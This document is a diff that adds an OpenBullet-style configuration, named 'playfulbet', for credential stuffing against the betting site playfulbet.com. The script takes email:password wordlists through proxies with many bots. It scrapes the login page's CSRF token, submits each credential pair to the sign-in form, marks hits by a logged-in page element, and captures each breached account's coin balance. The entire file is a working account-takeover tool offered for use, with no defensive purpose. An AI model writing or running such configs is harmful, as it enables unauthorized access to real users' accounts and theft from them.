@@ -1,0 +1,59 @@
+[SETTINGS]
+{
+  "Name": "playfulbet",
+  "SuggestedBots": 100,
+  "MaxCPM": 0,
+  "LastModified": "2019-06-16T01:46:27.2821354+02:00",
+  "AdditionalInfo": "",
+  "Author": "Brian",
+  "Version": "1.1.3",
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "EncodeData": false,
+  "AllowedWordlist1": "MailPass",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+REQUEST POST "https://playfulbet.com/users/sign_in?locale=es" 
+  
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+  HEADER "origin: https://playfulbet.com" 
+  HEADER "referer: https://playfulbet.com/" 
+
+PARSE "<SOURCE>" LR "meta name=\"csrf-token\" content=\"" "\" /><!--" -> VAR "AUTHTOKEN" 
+
+REQUEST POST "https://playfulbet.com/users/sign_in?locale=es" 
+  CONTENT "utf8=%E2%9C%93&authenticity_token=<AUTHTOKEN>&user%5Blogin%5D=<USER>&user%5Bpassword%5D=<PASS>&user%5Bremember_me%5D=1&button=" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+  HEADER "origin: https://playfulbet.com" 
+  HEADER "referer: https://playfulbet.com/" 
+
+FUNCTION Delay "3000" 
+
+KEYCHECK 
+  KEYCHAIN Success OR 
+    KEY "\"><b class=\"active-coins lnum\">" 
+  KEYCHAIN Failure OR 
+    KEY "Show password" 
+
+PARSE "<SOURCE>" LR "\"><b class=\"active-coins lnum\">" "</b>&" -> CAP "Coins" 
+
